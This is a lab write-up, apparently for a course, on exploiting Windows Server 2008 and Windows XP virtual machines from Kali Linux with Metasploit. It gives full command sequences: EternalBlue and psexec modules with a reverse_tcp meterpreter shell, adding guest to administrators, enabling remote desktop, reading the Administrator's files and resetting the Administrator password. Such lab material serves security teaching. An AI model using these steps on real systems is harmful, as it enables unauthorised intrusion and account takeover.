# Penetration tests
## Sumary

Break into a couple of windows systems using Metasploit.


## Descritpion

Using a kali linux virtual machine, the objective break into a windows server 2008 using Metasploit. [Metasploit](https://www.metasploit.com/). [Metasploit](https://openwebinars.net/blog/que-es-metasploit/) is an open source project that helps us investigate security vulnerabilities. Using the [Eternalblue](https://es.wikipedia.org/wiki/EternalBlue) and [Psexec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/) exploits, penetrability tests will be performed on a virtual machine with Windows Server and another with Windows Xp.

## Steps to reproduce:

1. **Install Vm's**
- Install [VirtualBox](https://www.virtualbox.org/wiki/Downloads)  6.1.14
- Download the [Kali Linux ova](https://images.kali.org/virtual-images/kali-linux-2020.3-vbox-amd64.ova) version 2020.3 for VirtualBox
- Download the [Windows server 2008 ova](https://storage.googleapis.com/isos-iteso-esi-1/isos/WindowsServer2008.ova).
- Donwload the second target [Windows Xp ova](https://storage.googleapis.com/isos-iteso-esi-1/isos/WinXP.ova).

	- Kali
			- Open VirtualBox and select the option "import virtualized service" and select the file "kali-linux-2020.3-vbox-amd64.ova".
			- Import the VM.
			- Go to settings of this VM and select network. Enable two adapters; a Host-only adapter and a NAT adapter.
			- Start the virtual machine. User  `kali` password `kali`.
			- Use the command `sudo su` in a terminal to login into the root account. Password `kali`.

	- Windows Server 
			- Open VirtualBox and select the option "import virtualized service" and select the file "WindowsServer2008.ova".
			- Import the VM.
			- Go to settings of this VM and select network. Enable one adapter; a Host-only adapter.
			- Start the virtual machine.

	- Windows Xp
			- Open VirtualBox and select the option "import virtualized service" and select the file "WinXP.ova".
			- Import the VM.
			- Go to settings of this VM and select network. Enable one adapter; a Host-only adapter.
			- Start the virtual machine.
	
- Disable firewalls and antivirus.
	
2. **Windows server**
- In the kali terminal where you used the command "sudo su" use the command `nmap -O [network/24]` to get hosts, OS guesses, and the ip address of the Windows Server. 
- Use the command `service postgresql start` to initialize the PostgreSQL database.
- Use the command `msfconsole` to start [Metasploit](https://null-byte.wonderhowto.com/how-to/metasploit-basics/).
- Use the command `use exploit/windows/smb/ms17_010_eternalblue` to use the exploit module.
- Use the command `set rhosts [Server IP]` to specify the IP address of the target.
- Use the command `set payload windows/x64/meterpreter/reverse_tcp` to load the trusty reverse_tcp shell as the payload.
- Use the command `set lhost [Kali IP]` to set the listening host to the IP address of our local machine.
- Use the command `set lport 4321` to set the listening port to a suitable number.
- Use the command `run` to run the exploit.
- Use the command `shell` to drop into a system command shell.
- Use the command `net localgroup administrators guest /add` to scall privileges with yhe guest.
- Use the command `exit` to get out of the system command shell and return to the meterpreter console.
- Use the command `run getgui -e` to enable remote desktop connection.
- In a new kali terminal use the command `rdesktop -u guest [Server IP]` to create a remote connection with the guest user.
- Use the command `shell` to drop into a system command shell.
- Use the command `cd..` twice.
- Use the command `cd Users`.
- Use the command `cd Administrator`.
- Use the command `cd Documents`.
- Use the command `Type secret.txt.txt`.
- Use the command `exit` to get out of the system command shell and return to the meterpreter console.
- In a new kali terminal use the command `sudo su` to get root privileges.
- Use the command `nmap -Pn -v --script vuln [Server IP]` to verify for vunerabilities in other services.
- In the meterpreter console use the command `shell` to drop into a system command shell.
- Use the command `net user Administrator [new password]` to change the Administrator password.


3. **Windows Xp**
- In the kali terminal where you used the command "sudo su" use the command `nmap -O [network/24]` to get hosts, OS guesses, and the ip address of the Windows Server. 
- Use the command `msfconsole` to start [Metasploit](https://null-byte.wonderhowto.com/how-to/metasploit-basics/).
- Use the command `use exploit/windows/smb/ms17_010_psexec` to use the exploit module.
- Use the command `set rhosts [Windows IP]` to specify the IP address of the target.
- Use the command `set payload windows/x64/meterpreter/reverse_tcp` to load the trusty reverse_tcp shell as the payload.
- Use the command `set lhost [Kali IP]` to set the listening host to the IP address of our local machine.
- Use the command `set lport 4321` to set the listening port to a suitable number.
- Use the command `run` to run the exploit.
- Use the command `shell` to drop into a system command shell.
- Use the command `net localgroup administrators guest /add` to scall privileges with yhe guest.
- Use the command `exit` to get out of the system command shell and return to the meterpreter console.
- Use the command `run getgui -e` to enable remote desktop connection.
- In a new kali terminal use the command `rdesktop -u guest [WindowsIP]` to create a remote connection with the guest user.
- Use the command `shell` to drop into a system command shell.
- Use the command `cd..` twice.
- Use the command `cd Documents and Settings`.
- Use the command `cd Administrator`.
- Use the command `cd My Documents`.
- Use the command `Type secret.txt`.
- Use the command `exit` to get out of the system command shell and return to the meterpreter console.
- In a new kali terminal use the command `sudo su` to get root privileges.
- Use the command `nmap -Pn -v --script vuln [Server IP]` to verify for vunerabilities in other services.
- In the meterpreter console use the command `shell` to drop into a system command shell.
- Use the command `net user Administrator [new password]` to change the Administrator password.




## References

- [VirtualBox 6.1.14](https://www.virtualbox.org/wiki/Downloads)
-  [Metasploit](https://www.metasploit.com/)
- [Eternalblue](https://es.wikipedia.org/wiki/EternalBlue)
- [Psexec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
- [ova Kali](https://images.kali.org/virtual-images/kali-linux-2020.3-vbox-amd64.ova)
- [ova Windos Server](https://storage.googleapis.com/isos-iteso-esi-1/isos/WindowsServer2008.ova)
- [ova Windows Xp](https://storage.googleapis.com/isos-iteso-esi-1/isos/WinXP.ova)



